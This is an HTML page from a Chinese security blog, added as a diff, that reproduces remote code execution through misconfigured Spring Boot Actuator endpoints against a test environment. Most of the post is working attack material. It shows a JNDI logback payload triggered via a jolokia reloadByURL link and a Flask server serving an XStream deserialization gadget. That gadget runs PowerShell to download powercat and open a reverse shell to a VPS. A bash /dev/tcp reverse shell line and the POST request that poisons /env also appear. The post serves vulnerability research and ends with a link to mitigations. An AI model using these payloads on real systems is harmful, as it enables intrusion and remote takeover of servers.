@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+<title>Spring Boot Actuators配置不当导致RCE漏洞复现 - JF &#39; blog</title>
+<meta name="keywords" content="hexo,hexone">
+<meta name="description" content="a theme based on bootstrap">
+<meta name="author" content="John Doe">
+<meta name="generator" content="hexo">
+<meta name="jsonContent" content="/content.json">
+
+<link rel="alternate" href="/atom.xml" title="JF ' blog">
+
+<!-- Bootstrap -->
+<link href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<link rel="stylesheet" href="/css/style.css">
+
+  <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+  <!--[if lt IE 9]>
+    <script src="https://cdn.bootcss.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://cdn.bootcss.com/respond.js/1.4.2/respond.min.js"></script>
+  <![endif]-->
+<link rel="alternate" href="/atom.xml" title="JF ' blog" type="application/atom+xml">
+</head>
+<body class="bg">
+  <div class="container">
+    <header id="header" class="header">
+    <div class="site-info hidden-xs">
+        <p class="title">JF &#39; blog</p>
+        <p></p>
+        <p class="lead">Information is beautiful</p>
+        <!--<p class="subtitle">Information is beautiful</p>-->
+        <!--<p class="author">by John Doe</p>-->
+    </div>
+    <div class="nav-box">
+        <nav id="navbar" class="navbar navbar-inverse">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Brand and toggle get grouped for better mobile display -->
+                    <div class="navbar-header">
+                        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#hexone-navbar-collapse" aria-expanded="false">
+                            <span class="sr-only">Toggle navigation</span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                            <span class="icon-bar"></span>
+                        </button>
+                        <a href="/" class="navbar-brand visible-xs-inline">JF &#39; blog</a>
+                    </div>
+
+                    <!-- Collect the nav links, forms, and other content for toggling -->
+                    <div class="collapse navbar-collapse">
+                        <ul class="nav navbar-nav">
+                            
+                                
+                                    <li class><a href="/">首页</a></li>
+                                
+                                <li class="divider-vertical"></li>
+                            
+                                
+                                    <li class><a href="/archives">归档</a></li>
+                                
+                                <li class="divider-vertical"></li>
+                            
+                                
+                                    <li class><a href="/about.html">关于</a></li>
+                                
+                                <li class="divider-vertical"></li>
+                            
+                                
+                                    <li class="active"><a>Spring Boot Actuators配置不当导致RCE漏洞复现</a></li>
+                                
+                                <li class="divider-vertical"></li>
+                            
+                        </ul>
+                    </div>
+                </div><!-- /.navbar-collapse -->
+            </div><!-- /.container-fluid -->
+        </nav>
+    </div>
+</header>
+    <div class="row">
+      <section id="main" class="col-md-9 main">
+<article id="post-漏洞复现/Spring Boot Actuators配置不当导致RCE漏洞复现" class="article">
+  
+    <h1 class="title"><a href="/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Spring Boot Actuators配置不当导致RCE漏洞复现</a></h1>
+  
+    <p class="info">
+  <span class="info-item">日期: <a href="/archives/2019/03" class="date" title="20:16:20">2019-03-12</a></span>
+  <span class="info-item">更新: <a href="javascript: void(0)" class="date" title="01:14:44">2020-04-08</a></span>
+  <span class="info-item">分类: <a class="category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a></span>
+</p>
+  
+    <div class="content">
+  <p>漏洞分析源地址：<br><a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators" target="_blank" rel="external nofollow noopener noreferrer">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a></p>
+<p>关于springboot监控可以参考以下文章：<br><a href="https://www.freebuf.com/news/193509.html" target="_blank" rel="external nofollow noopener noreferrer">https://www.freebuf.com/news/193509.html</a></p>
+<p>测试环境，原作者提供的github：<br><a href="https://github.com/artsploit/actuator-testbed" target="_blank" rel="external nofollow noopener noreferrer">https://github.com/artsploit/actuator-testbed</a></p>
+<a id="more"></a>
+<p>复现过程：</p>
+<h4 id="1-Remote-Code-Execution-via-‘-jolokia’"><a href="#1-Remote-Code-Execution-via-‘-jolokia’" class="headerlink" title="1.Remote Code Execution via ‘/jolokia’"></a>1.Remote Code Execution via ‘/jolokia’</h4><p>前置条件：<br>在jolokia/list目录检索存在logback组件,则可以使用jolokia远程包含logback.xml配置文件，直接执行远程引用字节码：<br><a href="http://127.0.0.1:9090/jolokia/list" target="_blank" rel="external nofollow noopener noreferrer">http://127.0.0.1:9090/jolokia/list</a><br><img src="/images/2019/03/4140320665.png" alt></p>
+<p>1）在VPS上创建logback.xml，logback中填写jndi服务，当调用时直接触发恶意class。</p>
+<pre><code class="bash">&lt;configuration&gt;
+  &lt;insertFromJNDI env-entry-name=&quot;ldap://vps_ip:1389/jndi&quot; as=&quot;appName&quot; /&gt;
+&lt;/configuration&gt;</code></pre>
+<p><img src="/images/2019/03/1172285257.png" alt></p>
+<p>2）创建反弹shell的恶意class,并监听端口8081<br>javac Exploit.java -&gt; Exploit.class<br><img src="/images/2019/03/3849118789.png" alt><br>3）利用marshalsec创建jndi server地址指向恶意class监听的端口8081：<br><img src="/images/2019/03/1439155234.png" alt><br>4）监听反弹shell端口：</p>
+<p>4）访问springboot以下链接触发远程访问VPS地址logback.xml：<br><a href="http://127.0.0.1:9090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/VPS地址:8080!/logback.xml" target="_blank" rel="external nofollow noopener noreferrer">http://127.0.0.1:9090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/VPS地址:8080!/logback.xml</a><br>触发回显2333端口接收到主机whomai结果：<br><img src="/images/2019/10/420084106.png" alt></p>
+<h4 id="2-Config-modification-via-‘-env’"><a href="#2-Config-modification-via-‘-env’" class="headerlink" title="2. Config modification via ‘/env’"></a>2. Config modification via ‘/env’</h4><p>当第一种找不到logback配置可以尝试修改env配置文件进行xstream反序列化<br>前置条件：<br>Eureka-Client &lt;1.8.7（多见于Spring Cloud Netflix）<br>比如测试前台json报错泄露包名就是使用netflix：<br><img src="/images/2019/03/1695128671.png" alt><br>需要以下2个包</p>
+<pre><code class="bash">spring-boot-starter-actuator（/refresh刷新配置需要）
+spring-cloud-starter-netflix-eureka-client（功能依赖）</code></pre>
+<p>1）在VPS创建xstream文件，使用flask返回application/xml格式数据：</p>
+<pre><code class="python"># -*- coding: utf-8 -*-
+# @Time    : 2019/3/12 10:06
+# @Author  : j1anFen
+# @Site    :
+# @File    : run.py
+
+
+# linux反弹shell bash -i &gt;&amp;amp; /dev/tcp/192.168.20.82/9999 0&gt;&amp;amp;1
+# windows反弹shell
+# &lt;string&gt;powershell&lt;/string&gt;
+# &lt;string&gt;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);&lt;/string&gt;
+# &lt;string&gt;powercat -c 192.168.123.1 -p 2333 -e cmd&lt;/string&gt;
+
+from flask import Flask, Response
+
+app = Flask(__name__)
+
+@app.route(&#39;/&#39;, defaults={&#39;path&#39;: &#39;&#39;})
+@app.route(&#39;/&lt;path:path&gt;&#39;, methods = [&#39;GET&#39;, &#39;POST&#39;])
+def catch_all(path):
+    xml = &quot;&quot;&quot;&lt;linked-hash-set&gt;
+  &lt;jdk.nashorn.internal.objects.NativeString&gt;
+    &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;
+      &lt;dataHandler&gt;
+        &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;
+          &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;
+            &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;
+              &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
+                &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;
+                  &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;
+                  &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;
+                    &lt;command&gt;
+                    &lt;string&gt;powershell&lt;/string&gt;
+                    &lt;string&gt;IEX (New-Object System.Net.Webclient).DownloadString(&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;);&lt;/string&gt;
+                      &lt;string&gt;powercat -c [vps地址] -p 2333 -e cmd&lt;/string&gt;
+                    &lt;/command&gt;
+                    &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;
+                  &lt;/next&gt;
+                &lt;/iter&gt;
+                &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;
+                  &lt;method&gt;
+                    &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;
+                    &lt;name&gt;start&lt;/name&gt;
+                    &lt;parameter-types/&gt;
+                  &lt;/method&gt;
+                  &lt;name&gt;foo&lt;/name&gt;
+                &lt;/filter&gt;
+                &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;
+              &lt;/serviceIterator&gt;
+              &lt;lock/&gt;
+            &lt;/cipher&gt;
+            &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;
+            &lt;ibuffer&gt;&lt;/ibuffer&gt;
+          &lt;/is&gt;
+        &lt;/dataSource&gt;
+      &lt;/dataHandler&gt;
+    &lt;/value&gt;
+  &lt;/jdk.nashorn.internal.objects.NativeString&gt;
+&lt;/linked-hash-set&gt;&quot;&quot;&quot;
+    return Response(xml, mimetype=&#39;application/xml&#39;)
+if __name__ == &quot;__main__&quot;:
+    app.run(host=&#39;172.31.245.127&#39;, port=2333)</code></pre>
+<p>2）启动服务：</p>
+<pre><code class="bash">python3 flask_xstream.py</code></pre>
+<p>3）写入配置：</p>
+<pre><code class="bash">POST /env HTTP/1.1
+Host: 127.0.0.1:9090
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+
+eureka.client.serviceUrl.defaultZone=http://vps:2333/xstream</code></pre>
+<p><img src="/images/2019/03/134312817.png" alt></p>
+<p>刷新触发[POST]：<br><strong>一般情况需要等待3秒会有响应包，如果立即返回可能是服务缺少spring-boot-starter-actuator扩展包无法刷新漏洞则无法利用。</strong><br><img src="/images/2019/03/3068556996.png" alt><br>获取反弹shell：<br><img src="/images/2019/03/3495674142.png" alt></p>
+<h3 id="安全措施可参考："><a href="#安全措施可参考：" class="headerlink" title="安全措施可参考："></a>安全措施可参考：</h3><p><a href="https://xz.aliyun.com/t/2233" target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/2233</a></p>
+
+</div>
+  
+    <div class="copyright">
+    <p>如无特殊说明，均为原创内容。转载请注明出处！</p>
+</div>
+  
+    
+  
+    
+  <nav aria-label="pager" class="nav-pager">
+    <ul class="pager">
+      
+        <li class="previous"><a href="/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/elasticsearch+kibana%E6%90%AD%E5%BB%BA%E9%85%8D%E7%BD%AE%E5%88%9D%E4%BD%93%E9%AA%8C/"><span aria-hidden="true">&larr;</span> elasticsearch+kibana搭建配置初体验</a></li>
+      
+      
+        <li class="next"><a href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8postgresql%20getshell/">渗透中利用postgresql getshell <span aria-hidden="true">&rarr;</span></a></li>
+      
+    </ul>
+  </nav>
+
+  
+    
+  
+    <div id="disqus_thread" class="comment"></div>
+    <script>
+      var disqus_config = function(){
+        this.page.url = 'http://yoursite.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/';
+        this.page.identifier = 'post-漏洞复现/Spring Boot Actuators配置不当导致RCE漏洞复现';
+      };
+      (function(){
+        var d = document, s = d.createElement('script');
+        s.src = 'https://JF.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+      })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" target="_blank" rel="external nofollow noopener noreferrer">comments powered by Disqus.</a></noscript>
+  
+
+  
+</article></section>
+      <aside class="col-md-3 sidebar">
+
+  <!--<div id="widget-search" class="widget widget-search">-->
+  <!--<div class="widget-content">-->
+    <!--<form class="form-inline" id="widget-search-form" onsubmit="return false;">-->
+      <!--<div class="form-group">-->
+        <!--<input type="text" class="form-control" id="widget-search-keyword" placeholder="" autocomplete="off" autofocus>-->
+      <!--</div>-->
+      <!--<div class="form-group">-->
+        <!--<button type="submit" class="btn btn-default">搜索</button>-->
+      <!--</div>-->
+    <!--</form>-->
+    <!--<div class="modal fade widget-search-results" id="widget-search-results" tabindex="-1" role="dialog" aria-labelledby="widget-search-results">-->
+      <!--<div class="modal-dialog" role="document">-->
+        <!--<div class="modal-content">-->
+          <!--<div class="modal-body"></div>-->
+        <!--</div>-->
+      <!--</div>-->
+    <!--</div>-->
+  <!--</div>-->
+<!--</div>-->
+
+  <div id="widget-toc" class="widget widget-toc">
+  <h3 class="widget-title">目录</h3>
+  <div class="widget-content">
+    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Remote-Code-Execution-via-‘-jolokia’"><span class="toc-number">1.</span> <span class="toc-text">1.Remote Code Execution via ‘&#x2F;jolokia’</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Config-modification-via-‘-env’"><span class="toc-number">2.</span> <span class="toc-text">2. Config modification via ‘&#x2F;env’</span></a></li></ol><li class="toc-item toc-level-3"><a class="toc-link" href="#安全措施可参考："><span class="toc-number"></span> <span class="toc-text">安全措施可参考：</span></a>
+  </li></div>
+</div>
+
+  <div class="widget">
+    <h3 class="widget-title">友情链接</h3>
+    <ul>
+        <li><a href="http://blog.j0ck1e.com" title target="_blank" rel="external nofollow noopener noreferrer">蓝建</a></li>
+        <li><a href="https://www.3cac.com" title target="_blank" rel="external nofollow noopener noreferrer">卡</a></li>
+        <li><a href="http://blog.he4rt.me" title target="_blank" rel="external nofollow noopener noreferrer">he4rt</a></li>
+        <li><a href="https://sec.mrfan.xyz" title target="_blank" rel="external nofollow noopener noreferrer">饭先生</a></li>
+        <li><a href="https://www.waitalone.cn" title target="_blank" rel="external nofollow noopener noreferrer">独自等待</a></li>
+        <li><a href="https://www.ch1ng.com" title target="_blank" rel="external nofollow noopener noreferrer">金枪银矛小霸王</a></li>
+        <li><a href="https://www.scanfsec.com" title target="_blank" rel="external nofollow noopener noreferrer">scanf</a></li>
+    </ul>
+</div>
+</aside>
+      <div class="tools"><a href="javascript: void(0)" class="go-to-top" style="display: none;"><i class="fa fa-chevron-circle-up"></i></a></div>
+    </div>
+    <footer id="footer" class="footer">
+  <p>Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow noopener noreferrer">Hexo</a>. 勿忘初心.</p>
+</footer>
+  </div>
+  <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<!-- Include all compiled plugins (below), or include individual files as needed -->
+<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+<!-- main scripts -->
+
+<script src="/js/main.js"></script>
+
+<!-- seo -->
+<script>
+
+</script>
+<!-- statistics -->
+<div class="hidden">
+  
+  
+  
+  
+  
+</div>
+</body>
+</html>
